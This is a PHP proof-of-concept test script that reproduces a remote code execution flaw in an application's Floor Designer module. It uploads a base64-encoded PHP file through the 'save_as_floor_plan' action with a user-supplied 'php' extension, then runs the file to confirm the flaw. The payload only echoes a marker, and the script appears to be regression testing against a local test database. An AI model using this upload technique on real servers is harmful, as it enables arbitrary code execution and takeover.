<?php
/**
 * PoC for RCE in Floor Designer via 'save_as_floor_plan' action.
 */
define('ITM_CLI_SCRIPT', true);
putenv('DB_HOST=127.0.0.1');
putenv('DB_USER=root');
putenv('DB_PASS=itmanagement');
putenv('DB_NAME=itmanagement');
require_once __DIR__ . '/../../../config/config.php';
require_once __DIR__ . '/../../../scripts/lib/itm_script_test_employee.php';

$company_id = 1;
$testUser = itm_script_test_employee_create($conn, $company_id, ['script_slug' => 'repro-floor-rce']);
if (!is_array($testUser)) {
    die("Failed to create test user\n");
}
itm_script_test_employee_register_teardown($conn, (int)$testUser['id']);

$_SESSION['company_id'] = $company_id;
$_SESSION['employee_id'] = $testUser['id'];
$_SESSION['username'] = $testUser['username'];
$_SESSION['role_name'] = 'admin';

echo "Testing RCE via File Upload in modules/floor_designer/index.php\n";

$tmpFile = tempnam(sys_get_temp_dir(), 'php_poc');
file_put_contents($tmpFile, '<?php echo "RCE_SUCCESS"; ?>');

$_POST['ajax_action'] = 'save_as_floor_plan';
$_POST['name'] = 'RCE Test';
$_POST['ext'] = 'php';
$_POST['data'] = 'data:image/png;base64,' . base64_encode('<?php echo "RCE_SUCCESS"; ?>');
$_POST['csrf_token'] = itm_get_csrf_token();

chdir(__DIR__ . '/../../../modules/floor_designer');
ob_start();
include 'index.php';
$output = ob_get_clean();

$files = glob(FLOOR_PLAN_UPLOAD_PATH . $company_id . '/floor_plan_*.php');
if (!empty($files)) {
    $uploadedFile = $files[0];
    echo "Found uploaded file: " . $uploadedFile . "\n";
    $executionOutput = shell_exec("php " . escapeshellarg($uploadedFile));
    if (strpos($executionOutput, 'RCE_SUCCESS') !== false) {
        echo "VULNERABILITY CONFIRMED: Remote Code Execution successful.\n";
    }
    unlink($uploadedFile);
} else {
    echo "Uploaded file not found.\n";
}
unlink($tmpFile);
